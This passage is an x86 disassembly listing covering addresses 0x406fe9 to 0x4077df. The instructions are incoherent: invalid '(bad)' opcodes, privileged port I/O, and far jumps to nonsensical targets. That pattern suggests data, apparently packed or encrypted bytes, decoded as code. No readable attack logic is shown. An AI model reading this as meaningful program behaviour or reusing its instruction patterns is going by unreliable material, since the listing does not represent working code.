  406fe9:	sar    BYTE PTR [ebp+0x6bac3806],1
  406fef:	mov    ds:0xcbcebbfe,eax
  406ff4:	inc    eax
  406ff5:	in     al,dx
  406ff6:	mov    ebp,DWORD PTR [esi-0x4b3ca7f4]
  406ffc:	sbb    edi,DWORD PTR [esi+0xe3b8a28]
  407002:	jle    0x407055
  407004:	or     al,0xf7
  407006:	xchg   esi,eax
  407007:	adc    dl,dh
  407009:	shl    BYTE PTR [esi],0xd3
  40700c:	add    eax,0xfe82b099
  407011:	sti    
  407012:	xchg   BYTE PTR [edx-0x53],ah
  407015:	dec    esi
  407016:	fild   QWORD PTR [esi+0x28]
  407019:	pop    es
  40701a:	mov    dl,0x4a
  40701c:	aas    
  40701d:	inc    edi
  40701e:	inc    ecx
  40701f:	pop    ecx
  407020:	mov    al,0xae
  407022:	iret   
  407023:	push   0x193a9fb3
  407028:	dec    dh
  40702a:	sbb    DWORD PTR [eax],ecx
  40702c:	sub    al,0xd1
  40702e:	jns    0x4070a0
  407030:	loopne 0x407051
  407032:	push   edx
  407033:	fnstsw WORD PTR [ebp-0x1c]
  407036:	mov    ecx,0xe30af3ba
  40703b:	clc    
  40703c:	dec    esp
  40703d:	mov    ah,0x8e
  40703f:	xchg   ebp,eax
  407040:	mov    al,ds:0x249e4626
  407045:	pop    edx
  407046:	jl     0x40707e
  407048:	and    al,0xf7
  40704a:	sub    eax,0x479c8943
  40704f:	sub    al,0xcb
  407051:	pop    edx
  407052:	mov    esi,0x26a400e7
  407057:	and    BYTE PTR [ebx+0x72],0xc6
  40705b:	sbb    DWORD PTR [ebx+0x21],esp
  40705e:	pop    edx
  40705f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407060:	and    edx,DWORD PTR [ebp-0x18]
  407063:	sbb    BYTE PTR [edi],0x3d
  407066:	jl     0x4070e0
  407068:	mov    ebx,DWORD PTR [ebx+0x78ab80ce]
  40706e:	test   eax,0xb1a28494
  407073:	push   0x39
  407075:	mov    edi,0xae22b66c
  40707a:	adc    ecx,DWORD PTR [ebx]
  40707c:	mov    edi,0xe9e59889
  407081:	jmp    0x407101
  407083:	int    0xf6
  407085:	push   ss
  407086:	sub    ecx,DWORD PTR [edi]
  407088:	cmp    al,0x32
  40708a:	mov    edi,0x8797b52f
  40708f:	hlt    
  407090:	mov    esi,0x793cbb4e
  407095:	jb     0x407027
  407097:	inc    ecx
  407098:	xlat   BYTE PTR ds:[ebx]
  407099:	push   cs
  40709a:	adc    al,BYTE PTR [edx]
  40709c:	out    0xad,eax
  40709e:	adc    edx,DWORD PTR [eax-0xe]
  4070a1:	jno    0x40704b
  4070a3:	out    dx,al
  4070a4:	cmp    bl,BYTE PTR [edi+0x52]
  4070a7:	cwde   
  4070a8:	mov    ah,0x83
  4070aa:	fcom   DWORD PTR [ebx+0x37]
  4070ad:	jl     0x407093
  4070af:	icebp  
  4070b0:	les    esp,FWORD PTR [ebp-0x63]
  4070b3:	enter  0x52e9,0x76
  4070b7:	pop    edx
  4070b8:	dec    eax
  4070b9:	mov    edi,0xed82e16
  4070be:	rcr    BYTE PTR [ebp+0x6e0bfda2],0x44
  4070c5:	mov    ebx,0x5aa0e253
  4070ca:	sub    al,0x7b
  4070cc:	pop    ecx
  4070cd:	inc    bp
  4070cf:	bound  esi,QWORD PTR ds:0xc86d648d
  4070d5:	push   0xc30c38ed
  4070da:	xchg   edi,eax
  4070db:	call   0x6f05:0x3fdc6f2c
  4070e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e3:	xchg   BYTE PTR [edi-0x1d],dl
  4070e6:	mov    ebp,0x8e6399b0
  4070eb:	push   0x37
  4070ed:	(bad)  
  4070ee:	jnp    0x407162
  4070f0:	into   
  4070f1:	jl     0x4070e2
  4070f3:	pop    eax
  4070f4:	mov    ah,0x61
  4070f6:	leave  
  4070f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f8:	xor    BYTE PTR [ecx+0x35],ah
  4070fb:	push   0x7d
  4070fd:	xor    esp,DWORD PTR [esi+0x62134acd]
  407103:	(bad)  
  407105:	xchg   edi,eax
  407106:	into   
  407107:	sar    BYTE PTR [ecx-0x1c],cl
  40710a:	jecxz  0x40709b
  40710c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40710d:	mov    ch,0xd1
  40710f:	mov    esp,0x635016d7
  407114:	mov    bh,0xd6
  407116:	add    eax,0xe20519bc
  40711b:	test   dh,0x6e
  40711e:	mov    esp,0x9a07dd6a
  407123:	mov    ah,0xac
  407125:	xor    DWORD PTR [ebx+0x40],edx
  407128:	push   edx
  407129:	jmp    0x407145
  40712b:	push   0xe8eca206
  407130:	jns    0x407183
  407132:	ds icebp 
  407134:	cmp    al,0x9d
  407136:	ret    
  407137:	jmp    FWORD PTR [eax-0x357d92e]
  40713d:	jl     0x4070e4
  40713f:	mov    bh,0xa3
  407141:	clc    
  407142:	jnp    0x40719b
  407144:	and    BYTE PTR [bp-0x52],cl
  407148:	loope  0x40713e
  40714a:	xor    eax,0x371555e8
  40714f:	xor    BYTE PTR [ecx+0x1a],al
  407152:	jbe    0x4071b4
  407154:	xchg   BYTE PTR [ebx],bl
  407156:	mov    bh,0xdb
  407158:	inc    edi
  407159:	ss icebp 
  40715b:	xchg   edi,eax
  40715c:	dec    ebp
  40715d:	stos   DWORD PTR es:[edi],eax
  40715e:	hlt    
  40715f:	jns    0x407183
  407161:	mov    ecx,0x903c5fc7
  407166:	mov    bh,0x7e
  407168:	fsub   st,st(3)
  40716a:	ret    
  40716b:	lods   eax,DWORD PTR ds:[esi]
  40716c:	bound  edx,QWORD PTR [edi]
  40716e:	sahf   
  40716f:	xchg   ebx,eax
  407170:	push   0x0
  407172:	and    ebp,edx
  407174:	pop    es
  407175:	jmp    0x40713a
  407177:	jno    0x4071cc
  407179:	inc    ebx
  40717a:	gs out 0x1e,eax
  40717d:	add    BYTE PTR [ebx+0x2d],al
  407180:	mov    ch,0x71
  407182:	fidiv  WORD PTR [eax+0x6b11b765]
  407188:	rcl    bh,1
  40718a:	addr16 ret 0xcc9
  40718e:	pop    ecx
  40718f:	fdiv   DWORD PTR [esi+0xf]
  407192:	jns    0x407174
  407194:	sbb    al,0xfa
  407196:	xor    ecx,ecx
  407198:	in     eax,0x8f
  40719a:	mov    ah,0xd8
  40719c:	mov    ss,WORD PTR [edi+ecx*2+0x796b0f3a]
  4071a3:	enter  0x1fb2,0x72
  4071a7:	dec    BYTE PTR ds:0x9cd2f1b5
  4071ad:	cmp    al,al
  4071af:	mov    edi,ss
  4071b1:	mov    eax,0xc17bb63b
  4071b6:	dec    ebx
  4071b7:	mov    bl,0xf9
  4071b9:	or     eax,0xa4b420ab
  4071be:	aas    
  4071bf:	mov    ebp,0x62cc53e0
  4071c4:	xor    al,0x8c
  4071c6:	les    edx,FWORD PTR [esi]
  4071c8:	xchg   edi,eax
  4071c9:	push   edx
  4071ca:	into   
  4071cb:	retf   0x20ca
  4071ce:	mov    edi,0x7590edcd
  4071d3:	sbb    DWORD PTR [edx-0x541c5912],ecx
  4071d9:	inc    ebp
  4071da:	mov    ecx,0xd810f88a
  4071df:	stos   BYTE PTR es:[edi],al
  4071e0:	lods   al,BYTE PTR ds:[esi]
  4071e1:	inc    ebp
  4071e2:	dec    ecx
  4071e3:	dec    esp
  4071e4:	dec    ecx
  4071e5:	rcr    BYTE PTR [ebp+0x20],0x5a
  4071e9:	leave  
  4071ea:	pop    edi
  4071eb:	mov    cl,0xa2
  4071ed:	jmp    0x8280e603
  4071f2:	mov    eax,ds:0x459cc726
  4071f7:	cld    
  4071f8:	cmp    DWORD PTR [eax-0x3a],edx
  4071fb:	xor    BYTE PTR [ebx+0x1934aa6c],ah
  407201:	jne    0x40723d
  407203:	sbb    al,0xc6
  407205:	inc    edx
  407206:	fldcw  WORD PTR [ebx]
  407208:	shl    BYTE PTR [ebp+0x16a8ab10],cl
  40720e:	ins    BYTE PTR es:[edi],dx
  40720f:	ins    BYTE PTR es:[edi],dx
  407210:	pop    eax
  407211:	inc    DWORD PTR [ecx+0x31504612]
  407217:	add    BYTE PTR [ebp+0x3b70c37f],0x82
  40721e:	xor    edi,ebx
  407220:	in     al,0xaa
  407222:	in     eax,0xd2
  407224:	xchg   esp,eax
  407225:	push   es
  407226:	adc    BYTE PTR ss:[eax],bl
  407229:	lods   al,BYTE PTR ds:[esi]
  40722a:	sbb    cl,BYTE PTR [ebx]
  40722c:	out    dx,eax
  40722d:	mov    ds:0x38c5d060,eax
  407232:	and    al,0xd0
  407234:	mov    DWORD PTR [edi],ebx
  407236:	or     DWORD PTR [edx],esi
  407238:	lods   eax,DWORD PTR ds:[esi]
  407239:	pop    edi
  40723a:	test   eax,0xbed2e7a8
  40723f:	xchg   bh,dl
  407241:	add    ecx,DWORD PTR [ecx-0xb12143c]
  407247:	inc    esi
  407248:	mov    bl,bh
  40724a:	icebp  
  40724b:	addr16 jg 0x407273
  40724e:	dec    esi
  40724f:	mov    dh,0x2c
  407251:	xchg   edi,eax
  407252:	nop
  407253:	(bad)  
  407254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407255:	outs   dx,DWORD PTR ds:[esi]
  407256:	lea    ebp,[edi]
  407258:	js     0x407215
  40725a:	stos   DWORD PTR es:[edi],eax
  40725b:	inc    DWORD PTR [edi+0x1fcd7922]
  407261:	mov    al,ds:0x74707784
  407266:	or     DWORD PTR [ebx],eax
  407268:	mov    edx,0x5cd1e899
  40726d:	out    dx,al
  40726e:	jmp    0x696d5729
  407273:	sub    DWORD PTR [ebp+eiz*4+0x34e3e8f7],edx
  40727a:	stos   DWORD PTR es:[edi],eax
  40727b:	cld    
  40727c:	cld    
  40727d:	ins    BYTE PTR es:[edi],dx
  40727e:	sbb    BYTE PTR [ebx+ecx*8-0x42],cl
  407282:	add    DWORD PTR [edi],edx
  407284:	cmc    
  407285:	adc    BYTE PTR fs:[edx+0x6e78ff2c],ch
  40728c:	jl     0x407298
  40728e:	mov    WORD PTR ds:0x6d80701,gs
  407294:	dec    ebp
  407295:	jb     0x4072f7
  407297:	and    al,0x65
  407299:	sar    BYTE PTR [esi+0x37065fdb],1
  40729f:	out    dx,eax
  4072a0:	xchg   ebx,eax
  4072a1:	jo     0x407224
  4072a3:	mov    ah,0x5a
  4072a5:	and    ah,BYTE PTR [ebx]
  4072a7:	out    0x96,eax
  4072a9:	inc    ecx
  4072aa:	add    al,0x29
  4072ac:	fld    QWORD PTR [ebp+0x34966495]
  4072b2:	repz push edx
  4072b4:	es sbb edx,edi
  4072b7:	push   cs
  4072b8:	jmp    0x3377:0x56edbbba
  4072bf:	aaa    
  4072c0:	aad    0x69
  4072c2:	jp     0x40729e
  4072c4:	cmc    
  4072c5:	push   ebx
  4072c6:	pop    esi
  4072c7:	add    ah,dh
  4072c9:	scas   eax,DWORD PTR es:[edi]
  4072ca:	sbb    dl,BYTE PTR [ebx-0x9]
  4072cd:	mov    ebx,0x2bdafcfe
  4072d2:	mov    eax,DWORD PTR [esi+esi*4]
  4072d5:	add    esp,ecx
  4072d7:	pop    ebp
  4072d8:	jns    0x4072b8
  4072da:	sbb    eax,0xa7c3100
  4072df:	test   eax,0x3664236
  4072e4:	jnp    0x4072e0
  4072e6:	test   BYTE PTR [esi+0x2093b26],bl
  4072ec:	add    DWORD PTR [edi],0x1784c106
  4072f2:	cmp    cl,bl
  4072f4:	or     al,0x78
  4072f6:	cmp    al,0x1e
  4072f8:	imul   DWORD PTR [ebx+0x6f]
  4072fb:	sbb    edx,edx
  4072fd:	(bad)  
  4072fe:	push   esi
  4072ff:	sbb    cl,bl
  407301:	pop    edx
  407302:	dec    esi
  407303:	ins    BYTE PTR es:[edi],dx
  407304:	loop   0x4072e9
  407306:	sub    al,0x41
  407308:	enter  0x84e9,0x7b
  40730c:	ins    BYTE PTR es:[edi],dx
  40730d:	jbe    0x40736f
  40730f:	aad    0x44
  407311:	sub    edi,DWORD PTR [esi-0x2e29dcc0]
  407317:	lods   al,BYTE PTR ds:[esi]
  407318:	cmp    DWORD PTR [ebx+ebx*4],edx
  40731b:	xchg   DWORD PTR [esp+0x46a1e1ab],edi
  407322:	sbb    eax,edx
  407324:	xchg   esi,eax
  407325:	aad    0xdf
  407327:	pop    ss
  407328:	shl    DWORD PTR ds:0x5f846fb7,0xef
  40732f:	mov    BYTE PTR [esi-0x63],dl
  407332:	inc    edx
  407333:	add    al,0x12
  407335:	pop    ecx
  407336:	cmp    al,0xe4
  407338:	adc    DWORD PTR [ecx+0x5ab2688a],edx
  40733e:	loope  0x407358
  407340:	lahf   
  407341:	ret    
  407342:	push   ecx
  407343:	push   esi
  407344:	dec    edi
  407345:	mov    edi,ss
  407347:	mov    bh,0xef
  407349:	aaa    
  40734a:	xlat   BYTE PTR ds:[ebx]
  40734b:	mov    ch,0xc8
  40734d:	jmp    0xa76a130c
  407352:	mov    es,WORD PTR [ecx]
  407354:	int    0x8
  407356:	ins    BYTE PTR es:[edi],dx
  407357:	lahf   
  407358:	int    0x2a
  40735a:	fimul  DWORD PTR [eax]
  40735c:	or     ecx,DWORD PTR [ebp+0x213a7e5a]
  407362:	inc    esi
  407363:	sub    eax,0x882737c8
  407368:	mov    ebx,DWORD PTR [edx-0x393c212f]
  40736e:	push   edx
  40736f:	prefetch BYTE PTR es:[ecx-0x652a63cd]
  407377:	or     DWORD PTR [ebx],ebx
  407379:	clc    
  40737a:	pop    eax
  40737b:	mov    cs,WORD PTR [edi+0x12]
  40737e:	jo     0x4073f6
  407380:	jne    0x40737a
  407382:	fwait
  407383:	xchg   ecx,eax
  407384:	xchg   ecx,esi
  407386:	push   ebx
  407387:	pop    esi
  407388:	adc    al,bl
  40738a:	jl     0x40732d
  40738c:	je     0x40734a
  40738e:	enter  0xa8e2,0xc7
  407392:	cli    
  407393:	adc    DWORD PTR [ecx],0xa7203658
  407399:	out    dx,al
  40739a:	adc    ecx,DWORD PTR [eax]
  40739c:	mov    eax,ds:0x719a72ab
  4073a1:	std    
  4073a2:	jecxz  0x407332
  4073a4:	clc    
  4073a5:	jo     0x4073f4
  4073a7:	sbb    al,0x53
  4073a9:	cmp    esi,esp
  4073ab:	repz mov WORD PTR [edx],ss
  4073ae:	sub    eax,0x37e618a6
  4073b3:	into   
  4073b4:	mov    ebp,0x90d6567c
  4073b9:	cmp    al,0xc9
  4073bb:	mov    bl,0xf4
  4073bd:	jbe    0x407409
  4073bf:	fld    TBYTE PTR ds:[eax*8+0x10e6a7a8]
  4073c7:	sahf   
  4073c8:	aaa    
  4073c9:	mov    bh,0x15
  4073cb:	xlat   BYTE PTR ds:[ebx]
  4073cc:	stos   DWORD PTR es:[edi],eax
  4073cd:	call   0x364ba3c5
  4073d2:	mov    esp,0x1757ccb0
  4073d7:	les    ebp,FWORD PTR ds:0x590b2d4c
  4073dd:	pop    edx
  4073de:	add    al,0x41
  4073e0:	xor    DWORD PTR [edx-0x5e610c8b],edx
  4073e6:	popf   
  4073e7:	jle    0x4073dd
  4073e9:	jle    0x40746a
  4073eb:	push   esp
  4073ec:	xchg   edx,eax
  4073ed:	popf   
  4073ee:	jb     0x40741a
  4073f0:	fbld   TBYTE PTR [edx]
  4073f2:	adc    DWORD PTR [ebp-0x4d706efd],esi
  4073f8:	xchg   ebp,eax
  4073f9:	pop    ebp
  4073fa:	fbld   TBYTE PTR [ebx+ebp*8+0x6a95a28f]
  407401:	imul   edi,DWORD PTR [ebx+0x73],0x5088b54c
  407408:	inc    edx
  407409:	(bad)  
  40740a:	jle    0x40740f
  40740c:	sub    al,0x5b
  40740e:	mov    ds,WORD PTR [esi+ebp*4-0x3f8f450b]
  407415:	add    eax,0xcd65b47d
  40741a:	jnp    0x407413
  40741c:	xchg   ebp,eax
  40741d:	cwde   
  40741e:	(bad)  
  40741f:	lods   eax,DWORD PTR ds:[esi]
  407420:	imul   edi,DWORD PTR [ebx],0x2f13cf49
  407426:	or     bl,0xd
  407429:	daa    
  40742a:	loop   0x407406
  40742c:	mov    esi,0x802f1e8b
  407431:	test   eax,0xa76b5fd9
  407436:	push   esi
  407437:	mov    eax,0x7edf1
  40743c:	stos   BYTE PTR es:[edi],al
  40743d:	adc    DWORD PTR [esi-0xb],0x5d
  407441:	jne    0x4074a6
  407443:	and    edx,edx
  407445:	or     DWORD PTR [ebx-0x3b3b9881],esp
  40744b:	cmp    edx,edx
  40744d:	sub    al,0xfc
  40744f:	out    0xa7,al
  407451:	mov    edx,0xab155823
  407456:	fadd   DWORD PTR [edx]
  407458:	mov    edi,ecx
  40745a:	xchg   BYTE PTR [edi-0x687e8bba],dh
  407460:	out    dx,al
  407461:	jge    0x407451
  407463:	sbb    eax,0xd4f2c55d
  407468:	cmp    al,0x1c
  40746a:	shl    BYTE PTR [edx-0x6c3d6fdf],1
  407470:	sub    ebx,DWORD PTR cs:[esi]
  407473:	call   0xd3a5d4ed
  407478:	dec    edi
  407479:	inc    edi
  40747a:	add    bh,bh
  40747c:	into   
  40747d:	std    
  40747e:	dec    ebp
  40747f:	cs jl  0x40748e
  407482:	and    esp,edx
  407484:	aas    
  407485:	mov    ch,0x75
  407487:	popf   
  407488:	mov    al,ds:0x91e341df
  40748d:	push   ebp
  40748e:	dec    edi
  40748f:	fcmovu st,st(6)
  407491:	push   esp
  407492:	push   es
  407493:	lds    ebp,FWORD PTR [ebx]
  407495:	xchg   di,ax
  407497:	call   0x1bcf5c32
  40749c:	mov    dl,0x83
  40749e:	push   0xcbbfe778
  4074a3:	ficomp DWORD PTR [edx]
  4074a5:	stc    
  4074a6:	cmp    edi,DWORD PTR [ebx+0x7fd5122f]
  4074ac:	jnp    0x4074ec
  4074ae:	clc    
  4074af:	(bad)  
  4074b0:	mov    ebp,0x454304a1
  4074b5:	cmp    BYTE PTR [edx-0x6a],ch
  4074b8:	adc    ah,ah
  4074ba:	ja     0x40749a
  4074bc:	sub    bh,BYTE PTR [esi+0x31930525]
  4074c2:	xor    edi,DWORD PTR [ebx+0x50141d3e]
  4074c8:	push   esp
  4074c9:	cdq    
  4074ca:	xchg   ebp,ecx
  4074cc:	stc    
  4074cd:	jp     0x4074b5
  4074cf:	add    ch,BYTE PTR [ecx-0x4fbe5054]
  4074d5:	(bad)  
  4074d6:	ins    BYTE PTR es:[edi],dx
  4074d7:	jecxz  0x407553
  4074d9:	arpl   WORD PTR [ebx+0x2e50618],cx
  4074df:	retf   0x4a1f
  4074e2:	xchg   edx,eax
  4074e3:	jle    0x4074d0
  4074e5:	jp     0x40748b
  4074e7:	stos   BYTE PTR es:[edi],al
  4074e8:	mov    edi,0x95a7e9c5
  4074ed:	pop    eax
  4074ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ef:	pop    ebp
  4074f0:	pop    es
  4074f1:	pop    eax
  4074f2:	dec    ebx
  4074f3:	call   0xbfd0933e
  4074f8:	dec    ecx
  4074f9:	push   esi
  4074fa:	arpl   bp,ax
  4074fc:	adc    al,BYTE PTR [esi+0x7e]
  4074ff:	cdq    
  407500:	xchg   DWORD PTR [ebx],eax
  407502:	pop    ebx
  407503:	mov    bh,0x14
  407505:	inc    ecx
  407506:	or     edi,DWORD PTR [edx+0x35cdff37]
  40750c:	mov    eax,ds:0x42fa212e
  407511:	mov    ebx,0x1e66dde1
  407516:	sub    BYTE PTR [ecx+0x45],dh
  407519:	enter  0x2e22,0xc3
  40751d:	loope  0x4074e0
  40751f:	pop    ds
  407520:	push   0xffffffa3
  407522:	sbb    esi,0x7d07a6ec
  407528:	dec    edi
  407529:	icebp  
  40752a:	retf   0xee3b
  40752d:	das    
  40752e:	aam    0x15
  407530:	sub    eax,0xf8e14879
  407535:	ret    
  407536:	mov    ah,0x95
  407538:	scas   al,BYTE PTR es:[edi]
  407539:	adc    eax,0x18a3f8d7
  40753e:	addr16 sbb eax,0xf2e8568e
  407544:	ins    BYTE PTR es:[edi],dx
  407545:	sub    bl,BYTE PTR [ebp+0x5087fffb]
  40754b:	xchg   edx,eax
  40754c:	xchg   edx,eax
  40754d:	add    BYTE PTR gs:[edi+0x39],al
  407551:	add    dl,BYTE PTR [ebx-0x32]
  407554:	aaa    
  407555:	mov    dh,0xf7
  407557:	push   esp
  407558:	je     0x40758a
  40755a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40755b:	pop    esp
  40755c:	enter  0x60fc,0x26
  407560:	in     al,0x8c
  407562:	mov    edi,ss
  407564:	fild   DWORD PTR [ecx+0x41]
  407567:	sbb    al,0xc2
  407569:	mov    BYTE PTR [eax+0xe],dl
  40756c:	mov    dh,0x31
  40756e:	loop   0x407527
  407570:	test   eax,0xa3bf4287
  407575:	dec    ebp
  407576:	(bad)  
  407577:	jg     0x40754b
  407579:	mov    bl,0x82
  40757b:	test   ch,dl
  40757d:	mov    bh,0xf4
  40757f:	clc    
  407580:	mov    ds:0x809287f0,eax
  407585:	idiv   DWORD PTR [esi]
  407587:	and    ah,BYTE PTR ds:0x71488135
  40758d:	and    ch,BYTE PTR ds:0x6856f65a
  407593:	add    BYTE PTR [ecx+eax*2],bl
  407596:	outs   dx,BYTE PTR ds:[esi]
  407597:	test   eax,0x568213f3
  40759c:	das    
  40759d:	or     al,0x7a
  40759f:	mov    edi,ds
  4075a1:	push   edx
  4075a2:	mov    gs,WORD PTR [ebx]
  4075a4:	mov    al,ds:0xec84cfb
  4075a9:	sub    eax,0xe0baccda
  4075ae:	sbb    ebp,DWORD PTR [eax+0x6a1e0412]
  4075b4:	xor    BYTE PTR [edx+0x5c],bh
  4075b7:	pop    es
  4075b8:	sub    al,0xdb
  4075ba:	xchg   DWORD PTR [esi-0x1b],eax
  4075bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075be:	shl    edi,1
  4075c0:	cdq    
  4075c1:	mov    esi,0x5b7a71dc
  4075c6:	or     eax,0xffa08f1f
  4075cb:	out    dx,eax
  4075cc:	push   0x97464b4
  4075d1:	push   ds
  4075d2:	jl     0x407554
  4075d4:	daa    
  4075d5:	je     0x407584
  4075d7:	cmc    
  4075d8:	lods   eax,DWORD PTR es:[esi]
  4075da:	fdivr  st,st(7)
  4075dc:	pop    ss
  4075dd:	loop   0x40757b
  4075df:	and    DWORD PTR [edi],0x2811d390
  4075e5:	pop    esp
  4075e6:	out    0x18,al
  4075e8:	cmp    edx,ebx
  4075ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075eb:	mov    edi,0xe2cacc8f
  4075f0:	arpl   WORD PTR [edi],sp
  4075f2:	sub    edi,DWORD PTR [edx-0xa]
  4075f5:	xor    al,0x9f
  4075f7:	sbb    edi,DWORD PTR [edx-0x16cd4fa9]
  4075fd:	test   BYTE PTR [ecx+esi*4],cl
  407600:	data16 aad 0x6f
  407603:	mov    eax,ds:0xc3b31a67
  407608:	or     DWORD PTR [edi-0x4fa2d669],esi
  40760e:	ds jg  0x4075e5
  407611:	pop    edi
  407612:	dec    edi
  407613:	jae    0x407616
  407615:	push   ss
  407616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407617:	and    eax,0x308a1830
  40761c:	imul   eax,DWORD PTR [edx],0xffffffab
  40761f:	outs   dx,BYTE PTR ds:[esi]
  407620:	outs   dx,DWORD PTR ds:[esi]
  407621:	mov    edx,0x869b0e56
  407626:	dec    eax
  407627:	pusha  
  407628:	dec    esp
  407629:	popf   
  40762a:	push   edi
  40762b:	push   ecx
  40762c:	mov    ds:0x67200f53,eax
  407631:	enter  0x6622,0x81
  407635:	dec    edi
  407636:	jbe    0x4075bf
  407638:	lods   al,BYTE PTR ds:[esi]
  407639:	jb     0x407609
  40763b:	xchg   ebp,eax
  40763c:	pop    ecx
  40763d:	dec    ebx
  40763e:	pop    eax
  40763f:	sbb    bh,BYTE PTR [ebp-0x48d65edf]
  407645:	dec    ebx
  407646:	sbb    al,0x8f
  407648:	jne    0x4075e7
  40764a:	xor    dl,dl
  40764c:	push   cs
  40764d:	sar    DWORD PTR [ebp-0x599b501a],1
  407653:	inc    ebx
  407654:	(bad)  
  407655:	bound  ecx,QWORD PTR [ebp-0x7b]
  407658:	push   ss
  407659:	and    edx,DWORD PTR [eax+0x3b5beeff]
  40765f:	jae    0x407632
  407661:	pop    ecx
  407662:	jge    0x407642
  407664:	inc    eax
  407665:	or     ch,BYTE PTR [edx]
  407667:	mov    al,ds:0x93f53e8f
  40766c:	cli    
  40766d:	enter  0xa27b,0xf4
  407671:	add    BYTE PTR [edx],ah
  407673:	fbld   TBYTE PTR [edi-0x2895f07a]
  407679:	enter  0xf4dc,0xc8
  40767d:	add    eax,0xc24371a6
  407682:	mov    WORD PTR [eax-0x3f],gs
  407685:	int3   
  407686:	push   ecx
  407687:	test   BYTE PTR [eax+edi*1-0x4a6a9cfc],dl
  40768e:	mov    BYTE PTR gs:[edi+0x48222777],bl
  407695:	(bad)  
  407696:	mov    eax,ds:0x10385a7c
  40769b:	pop    edi
  40769c:	ins    BYTE PTR es:[edi],dx
  40769d:	mov    al,0x5d
  40769f:	out    0x8d,al
  4076a1:	ret    
  4076a2:	mov    al,0xf9
  4076a4:	xchg   esi,eax
  4076a5:	mov    ch,0xa1
  4076a7:	ja     0x407664
  4076a9:	aam    0x34
  4076ab:	or     bl,BYTE PTR fs:[esi+0x62]
  4076af:	iret   
  4076b0:	lds    eax,FWORD PTR cs:[esi-0x4e6b93e4]
  4076b7:	test   eax,0xe3c75ce6
  4076bc:	test   BYTE PTR [edx-0x5e236893],bl
  4076c2:	sbb    eax,0xd540d6dd
  4076c7:	aas    
  4076c8:	sbb    BYTE PTR ss:[esi],0xcc
  4076cc:	(bad)  
  4076cd:	mov    edi,0xcacdd42e
  4076d2:	mov    esi,0xaf2cc8d4
  4076d7:	out    0xca,al
  4076d9:	repz mov dl,dl
  4076dc:	mov    dh,0x81
  4076de:	jle    0x407660
  4076e0:	adc    al,0x2d
  4076e2:	(bad)  
  4076e3:	out    0xd2,eax
  4076e5:	popf   
  4076e6:	and    esp,esp
  4076e8:	(bad)  
  4076ea:	inc    edi
  4076eb:	in     al,dx
  4076ec:	inc    edi
  4076ed:	aad    0xed
  4076ef:	repz gs jns 0x407701
  4076f3:	and    bl,0x11
  4076f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076f7:	nop
  4076f8:	mov    edx,0x7e0faf69
  4076fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076fe:	out    0x56,al
  407700:	repz cdq 
  407702:	adc    ebp,DWORD PTR [ebp+edi*8-0x5b513f08]
  407709:	jl     0x407733
  40770b:	mov    bh,0xc1
  40770d:	mov    dl,0x29
  40770f:	xor    ah,bh
  407711:	jle    0x407792
  407713:	int    0xc4
  407715:	icebp  
  407716:	in     eax,0x25
  407718:	(bad)  
  407719:	call   0x83c873ac
  40771e:	mov    DWORD PTR [ecx],eax
  407720:	mov    esi,0x89f20c4e
  407725:	dec    edi
  407726:	lahf   
  407727:	dec    ebp
  407728:	add    BYTE PTR [esi],dl
  40772a:	arpl   WORD PTR [ebx+0x7d],bp
  40772d:	adc    BYTE PTR [ebx+0x13],cl
  407730:	add    dh,ah
  407732:	push   edx
  407733:	pop    ecx
  407734:	xchg   DWORD PTR ds:0xd6f0c4d4,esi
  40773a:	and    al,0xd4
  40773c:	leave  
  40773d:	dec    esi
  40773e:	dec    edi
  40773f:	xor    edx,DWORD PTR [ebp+0x31]
  407742:	inc    edx
  407743:	xchg   DWORD PTR [ecx+0x52fa56b8],edx
  407749:	adc    edx,DWORD PTR [ecx+0x54]
  40774c:	test   eax,0xa6c75e03
  407751:	cmp    edx,DWORD PTR [esi+0x1b499712]
  407757:	ins    BYTE PTR es:[edi],dx
  407758:	sub    bx,WORD PTR [ebx-0xb]
  40775c:	icebp  
  40775d:	or     ebx,esp
  40775f:	pop    eax
  407760:	hlt    
  407761:	aad    0x59
  407763:	fisttp QWORD PTR [esi-0x74]
  407766:	adc    DWORD PTR [eax-0x7899a29b],ecx
  40776c:	inc    esi
  40776d:	or     BYTE PTR [esi],al
  40776f:	fild   WORD PTR [edi-0x46bb67b]
  407775:	div    DWORD PTR [ecx-0x54]
  407778:	stos   BYTE PTR es:[edi],al
  407779:	loope  0x407710
  40777b:	fst    DWORD PTR [edi]
  40777d:	pusha  
  40777e:	inc    ecx
  40777f:	mov    al,ds:0xf6d3ddd
  407784:	lahf   
  407785:	lea    edi,[ebx]
  407787:	push   eax
  407788:	sbb    bl,BYTE PTR [esi+ebx*4]
  40778b:	sub    eax,ebp
  40778d:	fcmovu st,st(4)
  40778f:	mov    ebx,0x626668ed
  407794:	push   0xffffffb0
  407796:	stc    
  407797:	dec    ecx
  407798:	sbb    al,0xa8
  40779a:	mov    ds:0xb749cdfd,al
  40779f:	nop
  4077a0:	and    BYTE PTR [eax+0x182dadfd],dh
  4077a6:	push   esi
  4077a7:	sbb    al,0x72
  4077a9:	cmp    dh,ch
  4077ab:	or     BYTE PTR [ebx+0x2f4c0fca],cl
  4077b1:	jge    0x407746
  4077b3:	mov    ds:0x765e25af,al
  4077b8:	mov    ebx,0xd0fc37a
  4077bd:	mov    bl,0x7b
  4077bf:	scas   al,BYTE PTR es:[edi]
  4077c0:	and    bl,BYTE PTR [esi]
  4077c2:	aad    0x62
  4077c4:	push   eax
  4077c5:	jmp    0x4077c1
  4077c7:	(bad)  
  4077c8:	and    eax,0x1b45b296
  4077cd:	dec    ebx
  4077ce:	aas    
  4077cf:	shl    BYTE PTR [eax-0x31da32],1
  4077d5:	cmp    dl,cl
  4077d7:	add    DWORD PTR [eax-0x47130886],esi
  4077dd:	inc    ebp
  4077de:	dec    ecx
  4077df:	ss stos BYTE PTR es:[edi],al
